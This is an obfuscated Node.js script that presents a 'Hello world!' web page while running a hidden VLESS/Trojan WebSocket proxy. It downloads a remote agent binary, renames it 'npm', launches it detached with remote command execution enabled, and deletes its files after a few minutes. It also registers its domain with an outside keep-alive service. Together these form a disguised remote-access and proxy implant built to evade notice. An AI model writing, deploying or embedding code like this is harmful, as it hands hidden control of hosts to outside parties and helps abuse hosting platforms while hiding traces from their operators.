const _0x213764=_0x5ea5;(function(_0x3a5ef6,_0x56b6c0){const _0x57b2e4={_0x1e8210:0x12f,_0x57083a:0x140,_0x56b253:0x122,_0x44cbae:0x174,_0x35cf11:0x11c,_0x473caa:0x13f},_0x15a79e=_0x5ea5,_0x258e12=_0x3a5ef6();while(!![]){try{const _0x53f04d=parseInt(_0x15a79e(_0x57b2e4._0x1e8210))/0x1*(parseInt(_0x15a79e(_0x57b2e4._0x57083a))/0x2)+parseInt(_0x15a79e(0x125))/0x3*(-parseInt(_0x15a79e(0x115))/0x4)+parseInt(_0x15a79e(_0x57b2e4._0x56b253))/0x5+-parseInt(_0x15a79e(_0x57b2e4._0x44cbae))/0x6*(parseInt(_0x15a79e(0x131))/0x7)+parseInt(_0x15a79e(_0x57b2e4._0x35cf11))/0x8+-parseInt(_0x15a79e(0x152))/0x9+-parseInt(_0x15a79e(0x183))/0xa*(parseInt(_0x15a79e(_0x57b2e4._0x473caa))/0xb);if(_0x53f04d===_0x56b6c0)break;else _0x258e12['push'](_0x258e12['shift']());}catch(_0x397d55){_0x258e12['push'](_0x258e12['shift']());}}}(_0x73ba,0x9a515));const os=require('os'),http=require(_0x213764(0x10a)),fs=require('fs'),axios=require(_0x213764(0x138)),net=require('net'),path=require(_0x213764(0x15f)),crypto=require(_0x213764(0x12c)),{Buffer}=require(_0x213764(0x169)),{exec,execSync}=require(_0x213764(0x110)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x213764(0x11f)][_0x213764(0x130)]||_0x213764(0x167),NEZHA_SERVER=process[_0x213764(0x11f)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x213764(0x11f)][_0x213764(0x14e)]||'',DOMAIN=process['env'][_0x213764(0x15e)]||_0x213764(0x184),AUTO_ACCESS=process[_0x213764(0x11f)][_0x213764(0x118)]||!![],WSPATH=process['env'][_0x213764(0x10b)]||UUID[_0x213764(0x146)](0x0,0x8),SUB_PATH=process[_0x213764(0x11f)][_0x213764(0x120)]||'thdtks',NAME=process[_0x213764(0x11f)]['NAME']||'',PORT=process[_0x213764(0x11f)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x66f971={_0x202bb7:0x151,_0xdf889f:0x128},_0x2cef89=_0x213764;try{const _0x5c7b9c=await axios[_0x2cef89(0x111)](_0x2cef89(0x181)),_0x262108=_0x5c7b9c[_0x2cef89(_0x66f971._0x202bb7)];ISP=(_0x262108[_0x2cef89(0x171)]+'-'+_0x262108[_0x2cef89(0x132)])[_0x2cef89(_0x66f971._0xdf889f)](/ /g,'_');}catch(_0xa9d934){ISP=_0x2cef89(0x10d);}};GetISP();function _0x73ba(){const _0x5adca3=['every','trojan://','writeHead','toString','false','writeFileSync','readUInt8','2053','index.html','443','DOMAIN','path','true','find','Answer','then','message','application/dns-json','send','fe9a755c-187b-42b6-ad39-14c4cf032572','once','buffer','https://','&path=%2F','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','8.8.4.4','write','https://dns.google/resolve?name=','Status','country_code','readUInt16BE','arm64','1038pTCcYX','pipe','arm','trim','update','chmod\x20+x\x20npm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','connect','&type=A','\x20-p\x20','&fp=chrome&type=ws&host=','\x20with\x20all\x20DNS\x20servers','text/html','https://api.ip.sb/geoip','Failed\x20to\x20resolve\x20','600enWyBB','1234.abc.com','http','WSPATH','arch','Unknown','npm','url','child_process','get','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','createWriteStream','2184244HngOvK','vless://','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','join','from','connection','7882048AltQCS','application/json','https://oooo.serv00.net/add-url','env','SUB_PATH','readFile','3737895mUagSW','npm\x20running\x20error:','decode','6AlgBpB','2096','pop','replace','log','aarch64','Automatic\x20Access\x20Task\x20added\x20successfully','crypto','npm\x20is\x20running','stream','11ptEevH','UUID','10311vIXBmm','isp','concat','map','end','post','error','axios','base64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','reduce','includes','length','setsid\x20nohup\x20./npm\x20-s\x20','108713JTMlKO','168622jHcrfK','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1.1.1.1','8443','config.yaml','close','slice','utf-8','text/plain','type','npm\x20download\x20successfully','sha224','catch','https://amd64.ssss.nyc.mn/v1','NEZHA_KEY','2087','finish','data','794160HKtKTn','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running'];_0x73ba=function(){return _0x5adca3;};return _0x73ba();}function _0x5ea5(_0x5a87c5,_0x139b6c){const _0x73ba7b=_0x73ba();return _0x5ea5=function(_0x5ea54d,_0x438ba5){_0x5ea54d=_0x5ea54d-0x10a;let _0x1017c9=_0x73ba7b[_0x5ea54d];return _0x1017c9;},_0x5ea5(_0x5a87c5,_0x139b6c);}const httpServer=http['createServer']((_0x15c9d4,_0x20af7e)=>{const _0xb07b59={_0x27e023:0x10f,_0x33fdae:0x121,_0x4c0130:0x116,_0x5b52ff:0x17e,_0x288148:0x16b,_0x1d02a3:0x157,_0x4263a6:0x139,_0x15767f:0x148,_0x3eb914:0x135},_0x45f15d={_0x223ac4:0x180,_0x195c9d:0x135,_0x3a331:0x156},_0x366d5a=_0x213764;if(_0x15c9d4[_0x366d5a(_0xb07b59._0x27e023)]==='/'){const _0x2c4461=path[_0x366d5a(0x119)](__dirname,_0x366d5a(0x15c));fs[_0x366d5a(_0xb07b59._0x33fdae)](_0x2c4461,'utf8',(_0x35383f,_0x4ca819)=>{const _0x232861=_0x366d5a;if(_0x35383f){_0x20af7e[_0x232861(0x156)](0xc8,{'Content-Type':_0x232861(_0x45f15d._0x223ac4)}),_0x20af7e[_0x232861(_0x45f15d._0x195c9d)](_0x232861(0x112));return;}_0x20af7e[_0x232861(_0x45f15d._0x3a331)](0xc8,{'Content-Type':_0x232861(0x180)}),_0x20af7e['end'](_0x4ca819);});return;}else{if(_0x15c9d4[_0x366d5a(0x10f)]==='/'+SUB_PATH){const _0x170d42=NAME?NAME+'-'+ISP:ISP,_0x3da42a=_0x366d5a(_0xb07b59._0x4c0130)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x366d5a(_0xb07b59._0x5b52ff)+DOMAIN+_0x366d5a(_0xb07b59._0x288148)+WSPATH+'#'+_0x170d42,_0x4b0898=_0x366d5a(0x155)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x366d5a(0x17e)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x170d42,_0x1595e9=_0x3da42a+'\x0a'+_0x4b0898,_0x34cab4=Buffer[_0x366d5a(0x11a)](_0x1595e9)[_0x366d5a(_0xb07b59._0x1d02a3)](_0x366d5a(_0xb07b59._0x4263a6));_0x20af7e['writeHead'](0xc8,{'Content-Type':_0x366d5a(_0xb07b59._0x15767f)}),_0x20af7e[_0x366d5a(_0xb07b59._0x3eb914)](_0x34cab4+'\x0a');}else _0x20af7e[_0x366d5a(0x156)](0x194,{'Content-Type':_0x366d5a(0x148)}),_0x20af7e[_0x366d5a(0x135)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x213764(0x128)](/-/g,''),DNS_SERVERS=[_0x213764(0x16d),_0x213764(0x142)];function resolveHost(_0x5d5314){const _0x10f97a={_0x1ed05a:0x13d,_0x2c82e0:0x17f,_0x56ad74:0x16f,_0x50e6fb:0x17c,_0x45dbc8:0x165,_0x3a0a56:0x14c};return new Promise((_0x5a343c,_0x4fe078)=>{const _0x4fe505={_0x316198:0x151,_0x38c059:0x161};if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5d5314)){_0x5a343c(_0x5d5314);return;}let _0x20edb0=0x0;function _0x2a00f1(){const _0x3a3a6d=_0x5ea5;if(_0x20edb0>=DNS_SERVERS[_0x3a3a6d(_0x10f97a._0x1ed05a)]){_0x4fe078(new Error(_0x3a3a6d(0x182)+_0x5d5314+_0x3a3a6d(_0x10f97a._0x2c82e0)));return;}const _0x58b249=DNS_SERVERS[_0x20edb0];_0x20edb0++;const _0x3089e5=_0x3a3a6d(_0x10f97a._0x56ad74)+encodeURIComponent(_0x5d5314)+_0x3a3a6d(_0x10f97a._0x50e6fb);axios[_0x3a3a6d(0x111)](_0x3089e5,{'timeout':0x1388,'headers':{'Accept':_0x3a3a6d(_0x10f97a._0x45dbc8)}})[_0x3a3a6d(0x163)](_0x3244f1=>{const _0x22a0ae=_0x3a3a6d,_0x310338=_0x3244f1[_0x22a0ae(_0x4fe505._0x316198)];if(_0x310338[_0x22a0ae(0x170)]===0x0&&_0x310338['Answer']&&_0x310338['Answer']['length']>0x0){const _0x1f6cb5=_0x310338[_0x22a0ae(0x162)][_0x22a0ae(_0x4fe505._0x38c059)](_0x3c642e=>_0x3c642e[_0x22a0ae(0x149)]===0x1);if(_0x1f6cb5){_0x5a343c(_0x1f6cb5[_0x22a0ae(0x151)]);return;}}_0x2a00f1();})[_0x3a3a6d(_0x10f97a._0x3a0a56)](_0x5e6371=>{_0x2a00f1();});}_0x2a00f1();});}function handleVlessConnection(_0x4145be,_0x44638a){const _0x4f9617={_0x34921f:0x154,_0x580523:0x146,_0x490a03:0x172,_0x4b3676:0x119,_0x1ba649:0x13b,_0x534aa2:0x134,_0x349939:0x166,_0x317500:0x163,_0x42ee6a:0x14c},_0x9134aa={_0x335494:0x17b,_0x251093:0x137},_0x173771={_0x4160f0:0x17b,_0x511d3c:0x137},_0x671b77=_0x213764,[_0x28937a]=_0x44638a,_0x5f4df7=_0x44638a[_0x671b77(0x146)](0x1,0x11);if(!_0x5f4df7[_0x671b77(_0x4f9617._0x34921f)]((_0x11b7c9,_0x843a5a)=>_0x11b7c9==parseInt(uuid['substr'](_0x843a5a*0x2,0x2),0x10)))return![];let _0xa86d50=_0x44638a[_0x671b77(_0x4f9617._0x580523)](0x11,0x12)[_0x671b77(0x15a)]()+0x13;const _0x216c17=_0x44638a['slice'](_0xa86d50,_0xa86d50+=0x2)[_0x671b77(_0x4f9617._0x490a03)](0x0),_0x47cc27=_0x44638a[_0x671b77(0x146)](_0xa86d50,_0xa86d50+=0x1)[_0x671b77(0x15a)](),_0xd0f6bb=_0x47cc27==0x1?_0x44638a[_0x671b77(0x146)](_0xa86d50,_0xa86d50+=0x4)[_0x671b77(_0x4f9617._0x4b3676)]('.'):_0x47cc27==0x2?new TextDecoder()[_0x671b77(0x124)](_0x44638a[_0x671b77(_0x4f9617._0x580523)](_0xa86d50+0x1,_0xa86d50+=0x1+_0x44638a[_0x671b77(0x146)](_0xa86d50,_0xa86d50+0x1)['readUInt8']())):_0x47cc27==0x3?_0x44638a['slice'](_0xa86d50,_0xa86d50+=0x10)[_0x671b77(_0x4f9617._0x1ba649)]((_0x41110a,_0x127d08,_0x14c069,_0x37c192)=>_0x14c069%0x2?_0x41110a[_0x671b77(0x133)](_0x37c192[_0x671b77(0x146)](_0x14c069-0x1,_0x14c069+0x1)):_0x41110a,[])[_0x671b77(_0x4f9617._0x534aa2)](_0x2dfff1=>_0x2dfff1[_0x671b77(0x172)](0x0)[_0x671b77(0x157)](0x10))[_0x671b77(0x119)](':'):'';_0x4145be[_0x671b77(_0x4f9617._0x349939)](new Uint8Array([_0x28937a,0x0]));const _0x372ba3=createWebSocketStream(_0x4145be);return resolveHost(_0xd0f6bb)[_0x671b77(_0x4f9617._0x317500)](_0x2cf7e2=>{const _0x1488f3={_0x442ab6:0x16e,_0x193fb5:0x146,_0x272cb7:0x175},_0x12d8a8=_0x671b77;net[_0x12d8a8(_0x173771._0x4160f0)]({'host':_0x2cf7e2,'port':_0x216c17},function(){const _0x90d837=_0x12d8a8;this[_0x90d837(_0x1488f3._0x442ab6)](_0x44638a[_0x90d837(_0x1488f3._0x193fb5)](_0xa86d50)),_0x372ba3['on']('error',()=>{})[_0x90d837(0x175)](this)['on'](_0x90d837(0x137),()=>{})[_0x90d837(_0x1488f3._0x272cb7)](_0x372ba3);})['on'](_0x12d8a8(_0x173771._0x511d3c),()=>{});})[_0x671b77(_0x4f9617._0x42ee6a)](_0x5c20cd=>{const _0x15d182={_0x790a2c:0x137},_0x46d9a0=_0x671b77;net[_0x46d9a0(_0x9134aa._0x335494)]({'host':_0xd0f6bb,'port':_0x216c17},function(){const _0xa9db15=_0x46d9a0;this['write'](_0x44638a['slice'](_0xa86d50)),_0x372ba3['on'](_0xa9db15(_0x15d182._0x790a2c),()=>{})[_0xa9db15(0x175)](this)['on']('error',()=>{})['pipe'](_0x372ba3);})['on'](_0x46d9a0(_0x9134aa._0x251093),()=>{});}),!![];}function handleTrojanConnection(_0x3d6783,_0x625f96){const _0x55fec1={_0x560aa1:0x13d,_0x41b3a0:0x157,_0x1aa358:0x14b,_0x68cda6:0x119,_0x3aac2d:0x146,_0x2a6860:0x134,_0x2de087:0x172,_0x1e02ee:0x163,_0x3d3aee:0x14c},_0x4b4023={_0x2aa5f5:0x137},_0x99131e={_0x4bb9ef:0x137},_0x343ff8=_0x213764;try{if(_0x625f96[_0x343ff8(_0x55fec1._0x560aa1)]<0x3a)return![];const _0x32e86b=_0x625f96[_0x343ff8(0x146)](0x0,0x38)[_0x343ff8(_0x55fec1._0x41b3a0)](),_0x12501a=[UUID];let _0x2fd45c=null;for(const _0x41dc15 of _0x12501a){const _0x542556=crypto['createHash'](_0x343ff8(_0x55fec1._0x1aa358))[_0x343ff8(0x178)](_0x41dc15)['digest']('hex');if(_0x542556===_0x32e86b){_0x2fd45c=_0x41dc15;break;}}if(!_0x2fd45c)return![];let _0x1884be=0x38;_0x625f96[_0x1884be]===0xd&&_0x625f96[_0x1884be+0x1]===0xa&&(_0x1884be+=0x2);const _0x5b5727=_0x625f96[_0x1884be];if(_0x5b5727!==0x1)return![];_0x1884be+=0x1;const _0x53c01d=_0x625f96[_0x1884be];_0x1884be+=0x1;let _0x72dac6,_0x35856e;if(_0x53c01d===0x1)_0x72dac6=_0x625f96['slice'](_0x1884be,_0x1884be+0x4)[_0x343ff8(_0x55fec1._0x68cda6)]('.'),_0x1884be+=0x4;else{if(_0x53c01d===0x3){const _0x28b971=_0x625f96[_0x1884be];_0x1884be+=0x1,_0x72dac6=_0x625f96[_0x343ff8(_0x55fec1._0x3aac2d)](_0x1884be,_0x1884be+_0x28b971)[_0x343ff8(0x157)](),_0x1884be+=_0x28b971;}else{if(_0x53c01d===0x4)_0x72dac6=_0x625f96[_0x343ff8(0x146)](_0x1884be,_0x1884be+0x10)[_0x343ff8(0x13b)]((_0x3071a2,_0x14db66,_0x4db376,_0x27f398)=>_0x4db376%0x2?_0x3071a2[_0x343ff8(0x133)](_0x27f398['slice'](_0x4db376-0x1,_0x4db376+0x1)):_0x3071a2,[])[_0x343ff8(_0x55fec1._0x2a6860)](_0x22b484=>_0x22b484[_0x343ff8(0x172)](0x0)[_0x343ff8(0x157)](0x10))[_0x343ff8(0x119)](':'),_0x1884be+=0x10;else return![];}}_0x35856e=_0x625f96[_0x343ff8(_0x55fec1._0x2de087)](_0x1884be),_0x1884be+=0x2;_0x1884be<_0x625f96[_0x343ff8(0x13d)]&&_0x625f96[_0x1884be]===0xd&&_0x625f96[_0x1884be+0x1]===0xa&&(_0x1884be+=0x2);const _0xa91ddc=createWebSocketStream(_0x3d6783);return resolveHost(_0x72dac6)[_0x343ff8(_0x55fec1._0x1e02ee)](_0x32259c=>{const _0x35a209={_0x17613a:0x13d,_0x2f6d1b:0x175},_0x470ce9=_0x343ff8;net['connect']({'host':_0x32259c,'port':_0x35856e},function(){const _0x76d351=_0x5ea5;_0x1884be<_0x625f96[_0x76d351(_0x35a209._0x17613a)]&&this[_0x76d351(0x16e)](_0x625f96[_0x76d351(0x146)](_0x1884be)),_0xa91ddc['on'](_0x76d351(0x137),()=>{})[_0x76d351(0x175)](this)['on']('error',()=>{})[_0x76d351(_0x35a209._0x2f6d1b)](_0xa91ddc);})['on'](_0x470ce9(_0x99131e._0x4bb9ef),()=>{});})[_0x343ff8(_0x55fec1._0x3d3aee)](_0x10d0db=>{const _0x458773={_0x5d13fe:0x175},_0x4f9f44=_0x343ff8;net[_0x4f9f44(0x17b)]({'host':_0x72dac6,'port':_0x35856e},function(){const _0x47acf6=_0x4f9f44;_0x1884be<_0x625f96['length']&&this[_0x47acf6(0x16e)](_0x625f96[_0x47acf6(0x146)](_0x1884be)),_0xa91ddc['on']('error',()=>{})['pipe'](this)['on'](_0x47acf6(0x137),()=>{})[_0x47acf6(_0x458773._0x5d13fe)](_0xa91ddc);})['on'](_0x4f9f44(_0x4b4023._0x2aa5f5),()=>{});}),!![];}catch(_0x3dce08){return![];}}wss['on'](_0x213764(0x11b),(_0x26a656,_0x91c63a)=>{const _0xca3941={_0x3b707e:0x164},_0xdba534={_0xddcdd2:0x145,_0x17872b:0x145},_0x548280=_0x213764,_0x2967da=_0x91c63a[_0x548280(0x10f)]||'';_0x26a656[_0x548280(0x168)](_0x548280(_0xca3941._0x3b707e),_0x4bd81c=>{const _0x577b98=_0x548280;if(_0x4bd81c['length']>0x11&&_0x4bd81c[0x0]===0x0){const _0x5983de=_0x4bd81c[_0x577b98(0x146)](0x1,0x11),_0xc720fb=_0x5983de['every']((_0x1789b5,_0x430d1a)=>_0x1789b5==parseInt(uuid['substr'](_0x430d1a*0x2,0x2),0x10));if(_0xc720fb){!handleVlessConnection(_0x26a656,_0x4bd81c)&&_0x26a656[_0x577b98(_0xdba534._0xddcdd2)]();return;}}!handleTrojanConnection(_0x26a656,_0x4bd81c)&&_0x26a656[_0x577b98(_0xdba534._0x17872b)]();})['on'](_0x548280(0x137),()=>{});});const getDownloadUrl=()=>{const _0x15a4e9={_0x266e91:0x10c,_0x20cb90:0x113,_0xd2c753:0x14d,_0x101f5a:0x117},_0x3dde0b=_0x213764,_0x39a86e=os[_0x3dde0b(_0x15a4e9._0x266e91)]();return _0x39a86e===_0x3dde0b(0x176)||_0x39a86e===_0x3dde0b(0x173)||_0x39a86e===_0x3dde0b(0x12a)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x3dde0b(_0x15a4e9._0x20cb90):!NEZHA_PORT?_0x3dde0b(_0x15a4e9._0xd2c753):_0x3dde0b(_0x15a4e9._0x101f5a);},downloadFile=async()=>{const _0x589b61={_0x2f0c8c:0x114,_0x1d43fa:0x10e,_0x47c49a:0x151},_0x429db2={_0x3ba456:0x137},_0x59ef14=_0x213764;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3059a6=getDownloadUrl(),_0x173adc=await axios({'method':_0x59ef14(0x111),'url':_0x3059a6,'responseType':_0x59ef14(0x12e)}),_0x68a9fd=fs[_0x59ef14(_0x589b61._0x2f0c8c)](_0x59ef14(_0x589b61._0x1d43fa));return _0x173adc[_0x59ef14(_0x589b61._0x47c49a)][_0x59ef14(0x175)](_0x68a9fd),new Promise((_0x24ee27,_0x44a6f8)=>{const _0x2dac8a={_0x190d70:0x129},_0x3238c0=_0x59ef14;_0x68a9fd['on'](_0x3238c0(0x150),()=>{const _0xc62fb=_0x3238c0;console[_0xc62fb(_0x2dac8a._0x190d70)](_0xc62fb(0x14a)),exec(_0xc62fb(0x179),_0x100908=>{if(_0x100908)_0x44a6f8(_0x100908);_0x24ee27();});}),_0x68a9fd['on'](_0x3238c0(_0x429db2._0x3ba456),_0x44a6f8);});}catch(_0x3fdfb7){throw _0x3fdfb7;}},runnz=async()=>{const _0x3c2a48={_0x534bcf:0x177,_0x489b39:0x15d,_0x1ae826:0x143,_0x30f0f0:0x15b,_0x51fd51:0x13c,_0x5bb0f1:0x13e,_0x5a0d5b:0x17d,_0x281a8f:0x13c,_0x3963f8:0x127,_0x1f54f2:0x13c,_0x4ff2dc:0x158,_0x45bbb9:0x17a,_0xb3ce3d:0x16c,_0x185019:0x141,_0x1c548b:0x159,_0x1b4fb0:0x144,_0x1bd83a:0x129,_0x46418f:0x153},_0x299a28={_0x2bf047:0x123,_0xc42dbb:0x12d},_0x373f70=_0x213764;try{const _0x215c7f=execSync(_0x373f70(0x13a),{'encoding':_0x373f70(0x147)});if(_0x215c7f[_0x373f70(_0x3c2a48._0x534bcf)]()!==''){console[_0x373f70(0x129)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4b2d24){}await downloadFile();let _0x7bc8ed='',_0x204942=[_0x373f70(_0x3c2a48._0x489b39),_0x373f70(_0x3c2a48._0x1ae826),_0x373f70(0x126),_0x373f70(0x14f),'2083',_0x373f70(_0x3c2a48._0x30f0f0)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4b7fee=_0x204942[_0x373f70(_0x3c2a48._0x51fd51)](NEZHA_PORT)?'--tls':'';_0x7bc8ed=_0x373f70(_0x3c2a48._0x5bb0f1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x373f70(_0x3c2a48._0x5a0d5b)+NEZHA_KEY+'\x20'+_0x4b7fee+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27e596=NEZHA_SERVER[_0x373f70(_0x3c2a48._0x281a8f)](':')?NEZHA_SERVER['split'](':')[_0x373f70(_0x3c2a48._0x3963f8)]():'',_0x3f5ed2=_0x204942[_0x373f70(_0x3c2a48._0x1f54f2)](_0x27e596)?_0x373f70(0x160):_0x373f70(_0x3c2a48._0x4ff2dc),_0x3e4fec='client_secret:\x20'+NEZHA_KEY+_0x373f70(_0x3c2a48._0x45bbb9)+NEZHA_SERVER+_0x373f70(_0x3c2a48._0xb3ce3d)+_0x3f5ed2+_0x373f70(_0x3c2a48._0x185019)+UUID;fs[_0x373f70(_0x3c2a48._0x1c548b)](_0x373f70(_0x3c2a48._0x1b4fb0),_0x3e4fec);}_0x7bc8ed='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x373f70(_0x3c2a48._0x1bd83a)](_0x373f70(_0x3c2a48._0x46418f));return;}}try{exec(_0x7bc8ed,{'shell':'/bin/bash'},_0x2932b1=>{const _0x5ea601=_0x373f70;if(_0x2932b1)console['error'](_0x5ea601(_0x299a28._0x2bf047),_0x2932b1);else console['log'](_0x5ea601(_0x299a28._0xc42dbb));});}catch(_0x3661fd){console[_0x373f70(0x137)]('error:\x20'+_0x3661fd);}};async function addAccessTask(){const _0x5c5b6c={_0x14c5e4:0x16a,_0x3676ae:0x11e,_0x13c0a3:0x11d,_0xd75f9:0x129},_0x3621d2=_0x213764;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x51dd44=_0x3621d2(_0x5c5b6c._0x14c5e4)+DOMAIN;try{const _0x3a3e61=await axios[_0x3621d2(0x136)](_0x3621d2(_0x5c5b6c._0x3676ae),{'url':_0x51dd44},{'headers':{'Content-Type':_0x3621d2(_0x5c5b6c._0x13c0a3)}});console[_0x3621d2(_0x5c5b6c._0xd75f9)](_0x3621d2(0x12b));}catch(_0x5c43ec){}}const delFiles=()=>{const _0x27b4f0={_0x1b329f:0x10e,_0x498912:0x144},_0x48eb97=_0x213764;fs['unlink'](_0x48eb97(_0x27b4f0._0x1b329f),()=>{}),fs['unlink'](_0x48eb97(_0x27b4f0._0x498912),()=>{});};httpServer['listen'](PORT,()=>{const _0x97d4fd=_0x213764;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x97d4fd(0x129)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
